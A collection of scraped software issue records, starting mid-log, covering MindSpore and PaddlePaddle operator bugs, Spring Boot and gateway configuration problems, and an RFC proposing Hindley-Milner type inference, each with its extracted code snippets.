[task.cc:2162]129140 PrintErrorInfo:model execute task failed, device_id=0, model stream_id=18, model task_id=1, model_id=1, first_task_id=65535 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.550.945 [task.cc:100] 129140 TaskFailCallBack: rtCode=0x7150050,[the model stream execute failed], errorTaskId=32, errorStreamId=17 [INFO] HCCL(127966,python3.7):2021-08-10-20:59:02.552.023 [task_exception_handler.cc:186][127966][129140]stream not found. the fail task is not from HCCL. streamid[17] [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.037 [pool.cc:429] 129140 GetTaskId: stream_id=18, task_id=7, serial_id=1 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.047 [engine.cc:1046] 129140 WaitNotify: Notify: count=2, idx=1, stream_id=18, task_id=2, type=0, error=0, payLoad=0 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.057 [pool.cc:452] 129140 GetItemBySerial: stream_id=18, task_id=8, serial_id=2 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.064 [engine.cc:1466] 129140 ProcessReport: report receive, stream_id=18, task_id=2. [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.079 [stream.cc:877] 129140 TryDelRecordedTask: del public task from stream, stream_id=18, tailTaskId=2, delTaskId=2, head=3, tail=3 [INFO] RUNTIME(127966,python3.7):2021-08-10-20:59:02.552.087 [pool.cc:452] 129140 GetItemBySerial: stream_id=18, task_id=8, serial_id=2   <code>: ''' TEST_SUMMARY:test net with embedding_lookup ps and conv2d heterogeneous, opt=adam, target=CPU ''' def test_parameter_server_embedding_heterogeneous_conv2d_adam_data_parallel(): context.set_context(enable_sparse=True) context.set_context(save_graphs=True) dataset = FakeData(size=1024, batch_size=32, image_size=(3, 32, 32), num_classes=30720, use_parallel=True) fact = NetFactory(dataset=dataset, conv_yg=True, embedding_ps=True, opt_yg=True, target='CPU', sparse=True, neg_index=False) fact.part_cmp()"
tensor draft for review,"This is only a draft of tensor implementation for review and it has not been fully tested. So DO NOT MERGE THIS PR. Comments are welcome if you have any idea or suggestion for my code. In addition, during my coding work I came up with several other questions that need to be discussed: Do we need to rename functions from Majel (such as member functions of and ) to follow google c++ style? In ported Majel code, we use glog to do asserting jobs, while in the other part of refactored Paddle we plan to use our own macro(). Are we going to unify them? is removed in current tensor design. Is that going to be a problem?   <code>: DDim Place paddle/platform/assert.h Stride"
有没有新手和我一样项目启动不起来？,"原始启动报错如下： 加上注解@SpringBootApplication(exclude = {DataSourceAutoConfiguration.class})后报错如下：   <code>: Description: Failed to configure a DataSource: 'url' attribute is not specified and no embedded datasource could be configured. Reason: Failed to determine a suitable driver class Action: Consider the following: If you want an embedded database (H2, HSQL or Derby), please put it on the classpath. If you have database settings to be loaded from a particular profile you may need to activate it (no profiles are currently active). Disconnected from the target VM, address: '127.0.0.1:52511', transport: 'socket' Description: Field messageTemplateDao in com.java3y.austin.controller.MessageTemplateController required a bean of type 'com.java3y.austin.dao.MessageTemplateDao' that could not be found. The injection point has the following annotations: - @org.springframework.beans.factory.annotation.Autowired(required=true) Action: Consider defining a bean of type 'com.java3y.austin.dao.MessageTemplateDao' in your configuration. Disconnected from the target VM, address: '127.0.0.1:52462', transport: 'socket' Process finished with exit code 1"
Cluster train task dispatching and task queues reconsideration,"According to https://github.com/PaddlePaddle/Paddle/blob/develop/doc/design/dist/README.md#task-queue we need to determine whether a task is finished or timeouted. The ""Pending Queue"" seems not suitable for this, because trainers may update the task status by . A key-value store may be a good choice? So we may only need two queues: TODO queue and Done queue, and another k-v store. Below shows the master process pseudo code: If we start a redis instance(container) in the master pod when using kubernetes, and configure redis to use ""AOF"" to persistent every write(use distributed filesystem, mounted on the pod), we can use redis as both queue and k-v store. When master pod fails, restarts the master will restore redis data from ""AOF"" file to continue task dispatching. Thanks for @Yancey discussed with me with these thoughts.   <code>: task-id for p in range(num_pass): put_all_task(todo_queue) while 1: finished, timeouts = check_task_stats() if finished: push(done_queue, finished) if timeouts: # FIXME: add slow node functions append(todo, timeouts) if task_all_done(): break sleep(1)"
[ST][MS][NET][fasterrcnn][GPU]loss  print 'nan' ,Use this template for r[ST][MS][NET][fasterrcnn]loss sometimes print 'nan'eporting a bug fasterrcnn 在GPU（A100）训练时loss打印nan / 硬件环境: /device GPU/ : -- MindSpore version :r1.7.0 B120 commit_id:4be97129 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_fasterrcnn_gpu_train_check_fps_1p_0001 get code from models sh run_distribute_train_gpu.sh loss正常打印 备注 提给潘峰峰   <code>: 146 s | epoch: 1 step: 50 total_loss: 0.78345 lr: 0.006175 152 s | epoch: 2 step: 50 total_loss: 1.04738 lr: 0.009925 158 s | epoch: 3 step: 50 total_loss: 1.18861 lr: 0.013675 164 s | epoch: 4 step: 50 total_loss: 0.42527 lr: 0.017425 169 s | epoch: 5 step: 50 total_loss: 1.00825 lr: 0.021175 175 s | epoch: 6 step: 50 total_loss: 1.58153 lr: 0.024925 181 s | epoch: 7 step: 50 total_loss: nan lr: 0.028675 187 s | epoch: 8 step: 50 total_loss: nan lr: 0.032425 193 s | epoch: 9 step: 50 total_loss: nan lr: 0.036175 200 s | epoch: 10 step: 50 total_loss: nan lr: 0.039925 206 s | epoch: 11 step: 50 total_loss: nan lr: 0.040000 212 s | epoch: 12 step: 50 total_loss: nan lr: 0.040000 218 s | epoch: 13 step: 50 total_loss: nan lr: 0.040000 224 s | epoch: 14 step: 50 total_loss: nan lr: 0.040000 230 s | epoch: 15 step: 50 total_loss: nan lr: 0.040000 236 s | epoch: 16 step: 50 total_loss: nan lr: 0.040000 243 s | epoch: 17 step: 50 total_loss: nan lr: 0.040000 249 s | epoch: 18 step: 50 total_loss: nan lr: 0.040000 255 s | epoch: 19 step: 50 total_loss: nan lr: 0.040000 261 s | epoch: 20 step: 50 total_loss: nan lr: 0.040000
远程图片下载在有类似src属性时不能完成下载,"例如这篇文章：http://wf.wenming.cn/wfwlwmcb/201906/t20190604_5887051.shtml 图片处代码： 里面含有oldsrc属性，点击远程图片下载未能正常工作，在编辑源码里把oldsrc=""W020190605390138630908.jpg""去掉，功能正常。猜想是不是在src的匹配上不够精准？   <code>: &lt;img width=""600"" alt="""" oldsrc=""W020190605390138630908.jpg"" complete=""complete"" src=""http://wf.wenming.cn/wfwlwmcb/201906/W020190605390138630908.jpg"" style=""margin: 0px; padding: 0px; border: 0px; vertical-align: bottom; max-width: 85%;""&gt;"
Fix read_source.md,Optimizer is not a part of fluid. The was missing.   <code>: paddle::platform
实体监听IEntityChangedListener 的 严重问题 2：监听中保存其他实体，该监听也会无限循环,"Furion 版本号 2.18.7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 当我在A实体监听事件OnChanging中 调用增删改B实体 的方法，并在该方法中执行 _rep.SaveNow() 时，也会无限循环的执行A实体监听OnChanging事件 【我也受益于ABP框架。难道Furion框架的实体监听的逻辑与abp不一样？】 无 public class SysOrgListener1 : IEntityChangedListener { public class SysOrgManager:ITransient { private readonly IRepository _rep; private readonly IRepository _userRep; public SysOrgManager(IRepository rep,IRepository userRep) { _rep = rep; _userRep=userRep; } public void OnChanging(SysOrg entity, EntityState state) { _userRep.SaveNow(); } } Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 保存B是保存B，为什么会无限的执行A实体监听事件？ 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: public void OnChanging(SysOrg entity, DbContext dbContext, Type dbContextLocator, EntityState state) { App.GetService&lt;SysOrgManager&gt;().OnChanging(entity, state); } public void OnChanged(SysOrg newEntity, SysOrg oldEntity, DbContext dbContext, Type dbContextLocator, EntityState state) { App.GetService&lt;SysOrgManager&gt;().OnChanged(newEntity, oldEntity, state); } }"
Create a Sub-Pipeline for Hindley Milner (HM)-based Type Inference,"RFC Create a Sub-Pipeline for Hindley Milner (HM)-based Type Inference Background, Current Challenges Currently, we use an Abstract Interpreter (AI)-based type inference algorithm, and face a lot of problems. Complexity: Theoretical limitation on optimizing for an Abstract Interpreter. State-of-the-art theoretical complexity for a 0CFA analysis (i.e. the most basic analysis to determine which function a variable is referring to, which corresponds to <em>ExecuteMultipleEvaluators</em> in the current implementation) is O(n^3). To optimize the current routine, we have to resort to software engineering effort or widening. Adhoc Implementation and Adhoc Specification: The deficiencies are illustrated in details in this issue. Difficult to extend to support dynamic shape static analysis: In the context of (runtime-)dynamic shape analysis, it is reasonable to assume that a proper fixed-point computation (or a more delicate and complex one) is needed to prevent (top of lattices) from appearing everywhere. However, current AI lacks a proper fixed-point computation and is already suffering from long compile time. In the dynamic shape context, the analysis needs to be able to handle symbolic values. However, current AI will simply broaden a symbolic value to . To properly support such analysis, one would require something similar to a SMT solver to perform automatic theorem proving (e.g., the shape of a tensor is a symbolic value times symbolic value ) instead of using abstract interpretation. Overly Complicated Implementation : Due to the current AI algorithm being unsound (thus lacking proper academic references), it tries to flatten the lattice and directly lifts to the 'top' of the lattice to avoid the requirement of fixed-point computation. This fundamentally defeats the purpose of using Abstract Interpretation. In the current case, express-ability is limited and is already very close to a HM-system, because over-approximation happens causing everything to be lifted to float. Further, there is no untagged union support. yet the complexity is much higher than HM's unification based algorithm; and imposes a lot of knowledge burden for future developers due to the unneeded abstraction in the current code-base. Essentially, since the current design does not make proper use of a lattice (e.g. no lattice bottom), then an Abstract Interpretation based solution is completely unnecessary. It makes the code-base overly complicated. Problem with the current AI-based system: It is an Adhoc Implementation: To address the lack of a proper fixed-point computation, one must look to the closest correct algorithm for a solution: Abstracting Definitional Interpretater. The design and software engineering skills needed to implement a proper monadic-style ADI or widening (widening the store) is challenging due to the lack of practical expertise. Further software engineering challenges lie ahead when implementing the widening operators in the existing code-base. It is likely that with the existing code-base, one may fallback to a case-by-case yet error-prone patch-style solution, making any future extension such as user-customized data-type, extremely difficult. AI-based algorithm does not have strong support for error-message reporting. Our proposal We propose to open up a sub-pipeline that uses the widely-used and mature Hindley-Milner (HM) unification-based type inference algorithm as the base framework. HM type system has been adopted by industries. With Typeclass as an extension, we can easily type the adhoc-polymorphic terms such as the addition or subscription operators, and even literal numbers. (e.g. list or tuple concat, integer or double addition, list or tuple getitem, literal number '3' can be interpreted as an integer or a float). Our Design Constraint Generation/Solving We plan to create a new pipeline, which will reuse some parts of the , and and reuse most of the other passes. We then attach our own passes and at the place where once was and . This new pipeline will only be triggered when a user at the Python level chooses as decoration. introduces primitives and strings as symbols, which are unfolded by . This now directly feeds to the HM inference algorithm. With the power of Polymorphism and Typeclass, we can achieve the following. For example, primitives . is a typeclass, which we will describe in details in another RFC. The essence here is to introduce an adhoc-polymorphism/function overloading mechanism (similar to Java's Interface, Rust's trait) using typeclass. After primitives are all typed, we proceed to the classical Constraint Generation/Solving for the HM algorithm, with the presence of Generalization/Instantiation (to handle polymorphism). Constraint Generation and Solving are separated in code, but Generation will call Solving during the run. We can make sure in our Constraint Generation, unlike an AI-based algorithm, every AnfNode is visited once and only once. Every graph is also visited once only. The main algorithm is as follows: Constraint Generation on grA deal with scoping information -- e.g. the current graph grA's parameters; and those sub-graphs (that are used, graphs_used) (avoiding (mutual) recursion) -- are assigned type variables for future constraint generation. enter each of the sub-graphs, using [1.Constraint Generation] recursively on each of the sub-graph solve the generated constraints, update the solution (by using substitution) GENERALIZING the sub-graphs solved-type, and Use the generalized type to perform constraint generation on grA.return_ Get the result of the above and solve the constraints We carefully avoid visiting graph/function through the constant nodes -- the type information for each graph/function primitive that a constant node points to is already ready during step 2, since step 1 has already handled all the dependent sub-graphs. This is the key we will visit each AnfNode only once (and where the almost linear time complexity comes from). We also need to pay attention to the interaction with the book keeping of typeclasses in this context, although trivial. Data representation for HM types We create a namespace called 'HM' to disambiguate the HM Types with the existing Abstract Value/Types. We use classical Algebraic Data Type Encoding (as we did with AnfNode) -- we create class , and class and every possible new type construct will be inherited from it, including Type Constructions such as , , , and so on. For each type there will be a series of auxiliary information such as Kind. We create , and in the HM namespace as IRMutator/IRVisitor in a visitor pattern style, which will be defined to support the above defined recursive structure in in a extensible manner. We can also make support the default C++ container, such as dictionary mapping (where substitution only happens on the co-domain), List/Vector, Tuple (one by one substitution), C++'s function (substitution happens on co-domain). Type Scheme also inherits from class and supports instantiate. Primitive Register -- Resource Manager We separately create a resource manager class focusing on handling the Primitive Declarations, so that we know what parts of interface is essential. At some later stage, this is to be integrated with the Resource Manager. Type Attachment After Type Inference is done, we have a mapping from each AnfNode to a type, each GraphNode to a typescheme; at that stage, a linear traversal occurs to attach each node with its type. Advantages: Our proposal has the following advantages: Lower Complexity: During constraint generation phase of HM, each graph/function and each AnfNode will only be visited once; and it is empirically well-known that HM acts almost linear in the real industrial sceanrio. Comparing to the current AI solution -- each AnfNode must be visited multiple times when the parent graph is invoked with different types; or just a single type that is inside recursion. Patching Current Concrete Problems: We freely allow user to express the scenario where Literal Number can be interpreted as Int and Double; we don't require halting of the program and also we accept the super-set of the current implementation and at the same time we can support Algebraic Datatype and thus Union in the future. Simpler Code Structure: The algorithm is compositional and simple to understand. Constraint Generation + Solving + Generalization are the essence of this algorithm. We also don't introduce useless and vacuous abstraction, leading to a more compact code-base. Possible Extension to Dynamic Shape Static Analysis : Liquid Type System gives a good framework for that. Mature Academic Reference/Industrial Experience: We also have a clear specification and formal definition of the system due to the formal research on HM's type system (a subpart of System F). Polymorphism is directly supported and user can declare a function with polymorphism if he wants, that makes polymorphism a feature in the Hindley-Milner system, while current AI-based solution handles polymorphism with the simulation of code duplication. HM is also the base framework for many programming languages we can refer to Apart from that, we also have the following advantages: HM is an unification-based algorithm, which means there is no merge during the ""fixed-point"" computation, but only unification. We can get-away with the error-prone case by case analysis of merging different types that happens in AI-based algorithm. There is no 'Any' in HM. With support of tagged union we can support all the cases untagged union explicitly and in a user-aware manner. Error-message reporting and other user-friendly features are researched used in industrial cases. HM is possible for modular inference because of the existence of polymorphism, and the type of a function is solely decided by its definition instead of the case where AI-based type inference will partially depend on the input type. It opens the possibility that function dispatch (for function overloading) can be achieved without monomorphization (by pushing dispatching into runtime) thus avoid code bloat. (Note that code size is heavily related to the compile time length.) Meanwhile, we don't need special backend primitive in VM like HM also opens up future possibility of other extensions -- Effect System, Liquid Type, Open Union, Pattern-Matching/Algebraic Datatype and so on. Trail No. Task Description Related Issue(URL) 1 Bugs in the Abstract Interpreter (AI) based Inference Engine link 2   <code>: Any AnyValue n m Parse Symbol Resolve HM-Inference Typeclass-Elimination Symbol Resolve Abstract Specialize @msfunction.HM Parse Symbol Resolve subtract :: Num T=&gt; (T,T) -&gt; T Num Type TypeNode TTuple TArrow TInt TList Substitute FreeVariable Generalize Type Substitute Type getattr"
Unit test for `lookup_table` OP with SelectedRows in grad.,"I've added support for BF16 data type in PR, however I can't find a way to test the grad calculations with ""W"" input as . Does this part of code checks also grad? Could you advise how to test grad calculations with ""W"" input as ?   <code>: SelectedRows SelectedRows"
Execution frequencies in inlined code cannot be accurate under --profileUse,"A good example is pr86231.c: The cfg of foo(): The path of execution in foo() is different in each invocation. It is impossible to know which invocation takes which path. The current strategy uses scaling, implemented in maple_ir/mir_nodes.cpp:BlockNode::CloneTreeWithFreqs(), in which numer is the frequency of the call site and denom is the entry frequency of the function being cloned. After the scaling, which is division by 8 in this example, the frequencies in the inlined body become inconsistent.   <code>: #define ONE ((void *) 1) #define TWO ((void *) 2) __attribute__((noipa)) int foo (void *p, int x) { if (p == ONE) return 0; if (!p) p = x ? TWO : ONE; return p == ONE ? 0 : 1; } int v[8]; int main () { if (foo ((void *) 0, 0) != 0 || foo ((void *) 0, 1) != 1 || foo (ONE, 0) != 0 || foo (ONE, 1) != 0 || foo (TWO, 0) != 1 || foo (TWO, 1) != 1 || foo (&amp;v[7], 0) != 1 || foo (&amp;v[7], 1) != 1) abort (); return 0; }"
"[CT][MS][switch_layer]Layers' output has different dtype, no exception is raised",": GPU /device gpu : -- MindSpore version : vm+GPU -- Python version : -- OS platform and distribution : -- GCC/Compiler version : No exception is raised   <code>: def test_parser_switch_layer_outputs_diff_dtype(): class Cast(Cell): def __init__(self, dtype): super().__init__() self.op = P.Cast() self.dtype = dtype def construct(self, x): y = self.op(x, self.dtype) return y+y class SwitchNegNet(Cell, MetaFactory): def __init__(self, funcs): super().__init__() MetaFactory.__init__(self) self.funcs = funcs self.op = P.Neg() def construct(self, i, inputs): x = self.funcs[i](inputs) x= self.op(x) return x func1 = TwoLayerReLU() func2 = Cast(ms.int32) funcs = (func1, func2) net = SwitchNegNet(funcs) input = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) i = Tensor(0, mstype.int32) with pytest.raises(ValueError) as err: netout = net(i, input)"
gateway聚合文档访问doc.html报403,启动类没有加@EnableSwagger2，因为加了会启动报错，其他代码都是按照https://xiaoym.gitee.io/knife4j/action/springcloud-gateway.html#_2-1-3-1-pom%E5%BC%95%E5%85%A5%E7%9B%B8%E5%85%B3jar%E5%8C%85来写的   <code>: &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.5.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;version&gt;2.2.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!--服务注册/发现中心依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;version&gt;2.2.1.RELEASE&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;*&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-ui&lt;/artifactId&gt; &lt;version&gt;2.0.9&lt;/version&gt; &lt;/dependency&gt;
【众智】【计算-AICPU开发】LayerNormGradGrad,"AICPU算子接入 LayerNormGrad算子的反向，未发现对标算子。LayerNorm算子是对Channel方向做归一化。 接口目录：mindspore/ops/operations/_grad_ops.py x LayerNorm算子的输入x dy LayerNorm算子的反传梯度值 variance LayerNorm算子的输出，x的方差 mean LayerNorm算子的输出，x的均值 gamma LayerNorm算子的输入gamm d_dx LayerNormGrad的输出dx的反向梯度 d_dg LayerNormGrad的输出dg的反向梯度 d_db LayerNormGrad的输出db的反向梯度 sopd_dy x的梯度输出 sopd_mean dy的梯度输出 sopd_gamma Gamma的梯度输出 对应底层算子 对应底层AICPU算子LayerNormGradGrad Classify Name Type Type Range Required Format INPUT x fp16,fp32 TRUE INPUT dy fp16,fp32 TRUE INPUT variance fp16,fp32 TRUE INPUT mean fp16,fp32 TRUE INPUT gamma fp16,fp32 TRUE INPUT d_dx fp16,fp32 TRUE INPUT d_dg fp16,fp32 TRUE INPUT d_db fp16,fp32 TRUE OUTPUT sopd_x fp16,fp32 TRUE OUTPUT sopd_dy fp16,fp32 TRUE OUTPUT sopd_gamma fp16,fp32 TRUE 标杆接口参考 3. 异常处理 4. 算子反向 无反向   <code>: class LayerNormGradGrad (Primitive):"
建议所有响应R的格式调整,"建议R的格式调整为 固定code msg data三个字段， 因为这样调你接口的获取你的数据，不用知道你的data 的key是哪个 例如 public class Response implements Serializable { /** * 响应业务状态 0 成功， 1失败 */ private Integer code; }   <code>: /** * 响应消息 */ private String msg; /** * 响应中的数据 */ private transient T data; private Response() { } public Response(int code, String msg) { this.code = code; this.msg = msg; } public static Response init(BaseCode respCode, String msg) { Response response = new Response(); response.setCode(respCode.getCode()); response.setMsg(msg); return response; } public static &lt;T&gt; Response init(BaseCode respCode, String msg, T data) { Response response = new Response(); response.setCode(respCode.getCode()); response.setMsg(msg); response.setData(data); return response; } public static &lt;T&gt; Response init(int code, String msg, T data) { Response response = new Response(); response.setCode(code); response.setMsg(msg); response.setData(data); return response; } public Response success() { return init(BaseCode.SUCCESS, BaseCode.SUCCESS.getMsg()); } public static Response success(Object data) { return init(BaseCode.SUCCESS, BaseCode.SUCCESS.getMsg(), data); } public static Response success(Object data, String msg) { return init(BaseCode.SUCCESS, msg, data); } public static Response fail(BaseCode respCode, String msg) { return init(respCode, msg); } public static Response fail() { return init(BaseCode.FAILD, BaseCode.FAILD.getMsg()); } public static Response fail(String msg) { return init(BaseCode.FAILD, msg); } public static boolean isSuccess(Response response) { return BaseCode.SUCCESS.getCode() == response.getCode(); }"
【众智】【计算-TBE接入】ExtractVolumePatches,提取立体中的一块数据，是extract_image_patches的3D格式扩展。 kernel_size tuple/int 属性 strides tuple/int 属性 padding str 属性 input_x output 对应底层算子 对应底层AI Core算子ExtractVolumePatches：   <code>: class ExtractVolumePatches(Primitive):
Send more infos to akg when compiling with json,"Task Description 在akg的接口加一个参数，用于传递算子编译的控制选项。 Task Goal 尽可能将算子的编译选项放在图层上控制 Sub Task No. Task Description 1 切分知识库路径：通过attr传递给composite层，并配置自定义知识库（优先于环境变量） 2 在线tuning： 通过attr传递给composite层。如果使能，则自动tuning 3 compute capability（GPU ONLY）：默认通过获取, 并通过info传递给composite，并设置attr给poly等供poly实现不同gpu架构的针对性优化。 Analysis task1目的是把知识库配置统一收归到图层，以后可以将知识库放到model_zoo的网络目录里面 akg已经支持参数，图层传个开关下去就能使能了。 capability需要放在算子info里（与""processor""并列），方便算子做架构特定优化   <code>: compilewithjson attrs MS_GRAPH_KERNEL_TILING cuDeviceGetAttribute ""online_tuning"""
"[CT][MS][op] the op with ArgMaxWithValue don't support tuple, tips is error",": Uncomment only one line, hit enter to put that in a new line, and remove leading whitespaces from that line: /device ascend : -- MindSpore version :ME+VM -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest -s test_argmaxwithvalue.py::test_argmaxwithvalue_input_256x2000_axis_0_keepdims_false ArgMaxWithValue axis dont support tuple,but log support ArgMaxWithValue axis dont support tuple,log also not support   <code>: def test_argmaxwithvalue_input_256x2000_axis_str_keepdims_false(): fact = ArgMaxWithValueFactory(input_shape=[256, 2000], axis='1', keep_dims=False) fact.forward_cmp() ../share/ops/argmaxwithvalue_ops.py:69: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/argmaxwithvalue_ops.py:40: in forward_mindspore_impl net = ArgMaxWithValue(axis=self.axis, keep_dims=self.keep_dims) ../share/utils.py:57: in __init__ super().__init__(*args, **kwargs) ../share/ops/argmaxwithvalue_ops.py:16: in __init__ self.op = op.ArgMaxWithValue(axis='1', keep_dims=keep_dims) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/ops/primitive.py:313: in deco fn(self, *args, **kwargs) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/ops/operations/array_ops.py:1188: in __init__ _check_infer_attr_reduce(axis, keep_dims, self.name) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/ops/operations/array_ops.py:89: in _check_infer_attr_reduce validator.check_value_type('axis', axis, [int, tuple], prim_name) /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/_checkparam.py:292: in check_value_type raise_error_msg() _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ def raise_error_msg(): """"""func for raising error message when check failed"""""" type_names = [t.__name__ for t in valid_types] num_types = len(valid_types) msg_prefix = f'For \'{prim_name}\' the' if prim_name else 'The' &gt; raise TypeError(f'{msg_prefix} type of `{arg_name}` should be {""one of "" if num_types &gt; 1 else """"}' f'{type_names if num_types &gt; 1 else type_names[0]}, but got {type(arg_value).__name__}.') E TypeError: For 'ArgMaxWithValue' the type of `axis` should be one of ['int', 'tuple'], but got str. /root/archiconda3/envs/liwuxia_vm/lib/python3.7/site-packages/mindspore/_checkparam.py:283: TypeError"
"[CT][MS][Probability]Uniform, kl_loss, cross_entropy AssertionError with tensorflow",": /device ascend : -- MindSpore version : 0.6.0 -- Python version : 3.7.5 -- OS platform and distribution : eulerosv2r8.aarch64 -- GCC/Compiler version : 7.3.0 pytest -s test_1.py::test_uniform_kl_loss_010 pass   <code>: ''' TEST_SUMMARY: uniform low = 0.0, high = 1.0, kl_loss dist=Uniform, low_b=0.2, high_b=2.0, low_a=0.4, high_a = 0.9 ''' def test_uniform_kl_loss_005(): class Net(NetKLLoss): def construct(self, low_b, high_b, low_a, high_a): return self.uniform.kl_loss(self.dist, low_b, high_b, low_a=low_a, high_a=high_a) low_b = 0.2 high_b = 2.0 low_a = 0.4 high_a = 0.9 net = Net() out_ms = net(Tensor(low_b, dtype=dtype.float32), Tensor(high_b, dtype=dtype.float32),Tensor(low_a, dtype=dtype.float32), Tensor(high_a, dtype=dtype.float32)) p = tfd.Uniform(low=low_b, high=high_b) q = tfd.Uniform(low=low_a, high=high_a) out = q.kl_divergence(p) with tf.Session() as sess: out_tf = sess.run(out) allclose_nparray(out_tf, out_ms.asnumpy(), 1e-4, 1e-4) ______________________________________________________________________________ test_uniform_kl_loss_005 ______________________________________________________________________________ @Author(""zwx5320437"") @Level3 def test_uniform_kl_loss_005(): class Net(NetKLLoss): def construct(self, low_b, high_b, low_a, high_a): return self.uniform.kl_loss(self.dist, low_b, high_b, low_a=low_a, high_a=high_a) low_b = 0.2 high_b = 2.0 low_a = 0.4 high_a = 0.9 net = Net() out_ms = net(Tensor(low_b, dtype=dtype.float32), Tensor(high_b, dtype=dtype.float32),Tensor(low_a, dtype=dtype.float32), Tensor(high_a, dtype=dtype.float32)) p = tfd.Uniform(low=low_b, high=high_b) q = tfd.Uniform(low=low_a, high=high_a) out = q.kl_divergence(p) with tf.Session() as sess: out_tf = sess.run(out) &gt; allclose_nparray(out_tf, out_ms.asnumpy(), 1e-4, 1e-4) test_1.py:1666: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/utils.py:22: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = 1.2809339, data_me = array(-0.8479968, dtype=float32), rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me)*rtol) loss_count = np.count_nonzero(greater) assert (loss_count/total_count) &lt; rtol,\ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"".\ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[1.2809339] E data_me_error:[-0.8479968] E loss:[2.1289306] ../share/utils.py:15: AssertionError"
批量插入不刷新缓存,当前使用版本 3.1.0 批量插入不刷新缓存，二级缓存设置false关闭也不行 同一个事务中先查询，然后批量插入，然后再查询，第二次查询sql不执行（log中没有打印）。 临时解决办法   <code>: SqlSession sqlSession = SqlHelper.sqlSession(Entity.class); sqlSession.clearCache();
Add ProgramDesc as an argument to Operator::Run,"Problem We have OPs (recurrent op, while op, parallel do op, conditional block op, recv op) that needs BlockDesc or ProgramDesc inside Operator::Run. Because currently Operator::Run does not take ProgramDesc as an argument, we serialize them into attributes, and deserialize during run. It has several issues: Hard to debug the ProgramDesc: the attribute is a binary string, we do not understand it when printing it out. Also Python will raise exception when parsing the message, because currently serialized ProgramDesc and BlockDesc is saved as , and Python parsing only support utf8 strings. Related issue: https://github.com/PaddlePaddle/Paddle/issues/7343 https://github.com/PaddlePaddle/Paddle/issues/7419 The following code shows up in many places in our codebase: From my understanding its a workaround to the fact that Operator::Run does not take ProgramDesc as an argument. Otherwise we could use the index of the BlockDesc in the ProgramDesc as an attribute. Solution Given some of our OP need ProgramDesc in run, one solution is to pass it as an argument of Operator::Run. I would oppose to this solution if OP does not use executor to run ProgramDesc. Currently OP can run program, I think it's reasonable to let OP know the ProgramDesc that it runs in.   <code>: print(program.to_string(True)) proto::string proto::string auto *block = Attr&lt;framework::BlockDesc *&gt;(kStepBlock); auto *program = block-&gt;Program();"
